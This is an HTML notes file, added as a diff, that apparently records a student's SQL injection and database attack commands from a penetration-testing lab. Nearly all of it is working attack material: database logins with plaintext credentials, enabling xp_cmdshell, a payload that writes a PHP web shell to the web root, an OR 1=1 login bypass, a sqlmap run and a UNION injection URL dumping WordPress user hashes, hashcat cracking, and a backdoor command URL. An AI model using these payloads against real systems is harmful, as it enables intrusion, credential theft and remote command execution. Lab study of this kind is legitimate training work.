@@ -1,0 +1,37 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Notes</title>
+</head><body>SELECT * FROM users WHERE user_name='leon' <br/>
+&nbsp;<br/>
+mysql -u root -p'root' -h 1<b>192.168.231.16</b>&nbsp; &nbsp;-P 3306 {connection to mysql}<br/>
+<br/>
+SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec'; &nbsp;<br/>
+<br/>
+impacket-mssqlclient Administrator:Lab123@192.168.231.18 &nbsp;-windows-auth {windows sql}<br/>
+<br/>
+SELECT name FROM sys.databases;<br/>
+<br/>
+SELECT * FROM offsec.information_schema.tables;<br/>
+<br/>
+select * from offsec.dbo.users;<br/>
+<br/>
+EXECUTE sp_configure 'show advanced options', 1;<br/>
+EXECUTE xp_cmdshell 'whoami';<br/>
+' UNION SELECT null, null, null, null, "&lt;?php system($_GET['cmd']);?&gt;", null INTO OUTFILE "/var/www/html/webshell.php" -- // &nbsp; <br/>
+<b><br/>
+</b><b>Payloads</b><br/>
+<br/>
+offsec' OR 1=1 -- // &nbsp; {Auth Bypass Payload}<br/>
+<br/>
+SELECT * FROM users WHERE user_name= 'offsec' OR 1=1 -- &nbsp; <br/>
+<br/>
+<span style="font-family: Consolas"><span style="font-size: 13pt"><div style="text-align: left">sqlmap "http://alvida-eatery.org:80/wp-admin/admin-ajax.php?action=get_question&amp;question_id=1 *" -b</div></span></span>&nbsp; <br/>
+<br/>
+http://alvida-eatery.org/wp-admin/admin-ajax.php?action=get_question&amp;question_id=1%20union%20select%201%2C1%2Cchar(116%2C101%2C120%2C116)%2Cuser_login%2Cuser_pass%2C0%2C0%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%20from%20wp_users<br/>
+<br/>
+<div style="text-align: left"><span style="font-size: 16pt"><span style="font-family: gg sans">&nbsp;hashcat -O -m 400 -a 0 -o cracked.txt target.txt rockyou.txt</span></span></div>&nbsp; <br/>
+<div style="text-align: left"><span style="font-size: 16pt"><span style="font-family: gg sans">hulabaloo</span></span></div>&nbsp; <br/>
+<br/>
+http://alvida-eatery.org/wp-admin/plugins.php&amp;plugin=simple-backdoor.php&amp;cmd=ls</body></html>
